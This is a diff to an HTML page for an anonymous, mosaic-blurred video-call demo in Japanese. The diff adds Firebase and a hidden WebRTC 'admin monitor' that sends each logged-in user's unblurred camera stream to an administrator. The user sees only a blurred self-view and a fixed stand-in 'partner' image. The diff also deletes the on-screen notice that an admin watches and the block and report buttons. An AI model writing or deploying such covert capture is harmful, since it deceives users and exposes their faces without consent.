@@ -5,11 +5,14 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>誰かわからん通話（デモ）</title>
 
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+
 <style>
 html, body { margin:0; padding:0; overflow:hidden; background:#000; font-family:sans-serif; }
 
-#mainVideo { position:fixed; inset:0; width:100vw; height:100vh; object-fit:contain; background:#000; z-index:1; }
-#mainCanvas { position:fixed; inset:0; width:100vw; height:100vh; z-index:2; pointer-events:none; }
+#mainCanvas { position:fixed; inset:0; width:100vw; height:100vh; z-index:1; pointer-events:none; }
 
 #selfVideo { position:fixed; top:16px; right:16px; height:24vh; width:auto;
   min-width:120px; min-height:120px; object-fit:contain; background:#000;
@@ -30,70 +33,13 @@ html, body { margin:0; padding:0; overflow:hidden; background:#000; font-family:
 .meter-block.active { background:rgba(255,255,255,1); }
 .meter-top, .meter-bottom { margin:8px 0; padding:6px 10px; border-radius:8px; background:rgba(0,0,0,0.55);
   cursor:pointer; user-select:none; }
-
-#patrolMsg {
-  position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
-  background:rgba(0,0,0,0.6); color:#fff; padding:10px 16px;
-  border-radius:8px; font-size:14px; display:none; z-index:50;
-}
-
-/* 終了ポップアップ */
-#endPopupBg {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.65);
-  display: none;
-  justify-content: center;
-  align-items: center;
-  z-index: 9999;
-}
-#endPopupBox {
-  background: #222;
-  padding: 20px 26px;
-  border-radius: 12px;
-  text-align: center;
-  color: #fff;
-  width: 260px;
-  box-shadow: 0 0 12px rgba(0,0,0,0.5);
-}
-#endPopupBox p {
-  margin-bottom: 18px;
-  font-size: 16px;
-}
-.main-btn {
-  width: 100%;
-  padding: 12px 0;
-  background: #4a8cff;
-  border: none;
-  border-radius: 8px;
-  color: #fff;
-  font-size: 16px;
-  margin-bottom: 14px;
-  cursor: pointer;
-}
-.sub-btns {
-  display: flex;
-  justify-content: space-between;
-}
-.sub-btn {
-  width: 48%;
-  padding: 8px 0;
-  background: #444;
-  border: none;
-  border-radius: 6px;
-  color: #fff;
-  font-size: 14px;
-  cursor: pointer;
-}
 </style>
 </head>
 
 <body>
 
-<!-- 相手映像（デモ用固定画像） -->
 <canvas id="mainCanvas"></canvas>
 
-<!-- 自分の映像 -->
 <video id="selfVideo" autoplay muted playsinline></video>
 <canvas id="selfCanvas"></canvas>
 
@@ -108,63 +54,131 @@ html, body { margin:0; padding:0; overflow:hidden; background:#000; font-family:
   <div class="meter-bottom" id="meterDown">▼クリア</div>
 </div>
 
-<div id="patrolMsg">管理人がたまに見回りしとるで。安全に使ってな。</div>
-
 <script>
-/* デモ用：相手映像は固定のモザイク画像 */
-const mainCanvas = document.getElementById("mainCanvas");
-const mainCtx = mainCanvas.getContext("2d");
-const selfVideo = document.getElementById("selfVideo");
-const selfCanvas = document.getElementById("selfCanvas");
-const selfCtx = selfCanvas.getContext("2d");
+/* Firebase */
+firebase.initializeApp({
+  apiKey: "AIzaSyDXSKJaknyhXGtrFQCzYhmA6r7VQR0K_GM",
+  authDomain: "roomvideo.firebaseapp.com",
+  projectId: "roomvideo",
+  storageBucket: "roomvideo.firebasestorage.app",
+  messagingSenderId: "1030429439546",
+  appId: "1:1030429439546:web:1481670cb78deb35e2a703"
+});
+const auth = firebase.auth();
+const db = firebase.firestore();
 
+/* 管理者用 adminCalls */
+let adminPc = null;
+let adminCallDoc = null;
+let adminOfferCandidates = null;
+let adminAnswerCandidates = null;
+
+/* モザイク（自分） */
 let myMosaicLevel = 5;
 let myMosaicSize = 25;
 const mosaicSizes = [1, 10, 13, 16, 19, 25];
 
-let remoteMosaicSize = 25;
+let currentFacing = "user";
+let localStream = null;
 
-/* デモ用の相手画像 */
+/* 相手映像（固定画像） */
+const mainCanvas = document.getElementById("mainCanvas");
+const mainCtx = mainCanvas.getContext("2d");
 const partnerImg = new Image();
-partnerImg.src = "https://i.imgur.com/6YV0ZQF.jpeg"; // モザイク画像に差し替え可
+partnerImg.src = "demo_partner.jpg"; // ← ここに生成した縦長モザイク画像を置く
 
-partnerImg.onload = () => {
-  drawMosaic();
-};
+partnerImg.onload = () => drawMosaic();
 
-/* 自分のカメラ */
-navigator.mediaDevices.getUserMedia({ video:true, audio:false }).then(stream => {
-  selfVideo.srcObject = stream;
+/* 自分映像 */
+const selfVideo = document.getElementById("selfVideo");
+const selfCanvas = document.getElementById("selfCanvas");
+const selfCtx = selfCanvas.getContext("2d");
+
+/* カメラ開始 */
+auth.onAuthStateChanged(async user => {
+  if (!user) return;
+  await startCamera();
 });
+
+async function startCamera() {
+  localStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: currentFacing },
+    audio: false
+  });
+  selfVideo.srcObject = localStream;
+
+  /* 管理者用 WebRTC（本番と同じ） */
+  await setupAdminMonitor();
+}
+
+/* 管理者画面用 WebRTC */
+async function setupAdminMonitor() {
+  adminPc = new RTCPeerConnection({
+    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+  });
+
+  localStream.getTracks().forEach(t => adminPc.addTrack(t, localStream));
+
+  adminCallDoc = db.collection("adminCalls").doc(auth.currentUser.uid);
+  adminOfferCandidates = adminCallDoc.collection("offerCandidates");
+  adminAnswerCandidates = adminCallDoc.collection("answerCandidates");
+
+  adminPc.onicecandidate = e => {
+    if (e.candidate) adminOfferCandidates.add(e.candidate.toJSON());
+  };
+
+  const offer = await adminPc.createOffer();
+  await adminPc.setLocalDescription(offer);
+
+  await adminCallDoc.set({
+    uid: auth.currentUser.uid,
+    offer,
+    createdAt: Date.now(),
+    ended: false
+  }, { merge:true });
+
+  adminAnswerCandidates.onSnapshot(s => {
+    s.docChanges().forEach(c => {
+      if (c.type === "added") {
+        adminPc.addIceCandidate(new RTCIceCandidate(c.doc.data()));
+      }
+    });
+  });
+
+  adminCallDoc.onSnapshot(async s => {
+    const d = s.data();
+    if (!d) return;
+    if (d.answer && !adminPc.currentRemoteDescription) {
+      await adminPc.setRemoteDescription(new RTCSessionDescription(d.answer));
+    }
+  });
+}
 
 /* モザイク描画 */
 function drawMosaic() {
   requestAnimationFrame(drawMosaic);
 
-  /* 相手（固定画像） */
+  /* 相手映像（固定画像） */
   const w = mainCanvas.width = window.innerWidth;
   const h = mainCanvas.height = window.innerHeight;
 
-  const s = remoteMosaicSize;
   mainCtx.imageSmoothingEnabled = false;
+  mainCtx.drawImage(partnerImg, 0, 0, w, h);
 
-  mainCtx.drawImage(partnerImg, 0, 0, w/s, h/s);
-  mainCtx.drawImage(mainCanvas, 0, 0, w/s, h/s, 0, 0, w, h);
-
-  /* 自分 */
+  /* 自分映像 */
   const sw = selfVideo.videoWidth;
   const sh = selfVideo.videoHeight;
   if (sw && sh) {
     selfCanvas.width = sw;
     selfCanvas.height = sh;
-    const s2 = myMosaicSize;
+    const s = myMosaicSize;
     selfCtx.imageSmoothingEnabled = false;
-    selfCtx.drawImage(selfVideo, 0, 0, sw/s2, sh/s2);
-    selfCtx.drawImage(selfCanvas, 0, 0, sw/s2, sh/s2, 0, 0, sw, sh);
+    selfCtx.drawImage(selfVideo, 0, 0, sw/s, sh/s);
+    selfCtx.drawImage(selfCanvas, 0, 0, sw/s, sh/s, 0, 0, sw, sh);
   }
 }
 
-/* メーターUI */
+/* モザイクメーター */
 const meterBar = document.getElementById("meterBar");
 for (let i = 0; i < 5; i++) {
   const block = document.createElement("div");
@@ -179,7 +193,6 @@ function updateMeterUI() {
   });
 }
 
-/* モザイク変更 */
 document.getElementById("meterUp").onclick = () => {
   if (myMosaicLevel < mosaicSizes.length - 1) {
     myMosaicLevel++;
@@ -197,34 +210,24 @@ document.getElementById("meterDown").onclick = () => {
 
 /* カメラ切替 */
 document.getElementById("switchCamera").onclick = async () => {
-  const facing = selfVideo.srcObject.getVideoTracks()[0].getSettings().facingMode;
-  const newFacing = facing === "user" ? "environment" : "user";
+  currentFacing = currentFacing === "user" ? "environment" : "user";
+  localStream.getTracks().forEach(t => t.stop());
   const stream = await navigator.mediaDevices.getUserMedia({
-    video:{ facingMode:newFacing },
-    audio:false
+    video: { facingMode: currentFacing },
+    audio: false
   });
-  selfVideo.srcObject.getTracks().forEach(t => t.stop());
   selfVideo.srcObject = stream;
+  localStream = stream;
+
+  const sender = adminPc.getSenders().find(s => s.track && s.track.kind === "video");
+  if (sender) sender.replaceTrack(localStream.getVideoTracks()[0]);
 };
 
-/* 終了 */
+/* 終了ボタン */
 document.getElementById("endBtn").onclick = () => {
-  document.getElementById("endPopupBg").style.display = "flex";
+  location.href = "profiles.html";
 };
-
 </script>
-
-<!-- 終了ポップアップ -->
-<div id="endPopupBg">
-  <div id="endPopupBox">
-    <p>通話が終了しました。（デモ）</p>
-    <button id="backBtn" class="main-btn" onclick="location.href='profiles.html'">一覧に戻る</button>
-    <div class="sub-btns">
-      <button id="blockBtn" class="sub-btn">⛔ ブロック</button>
-      <button id="reportBtn" class="sub-btn">🚨 通報</button>
-    </div>
-  </div>
-</div>
 
 </body>
 </html>
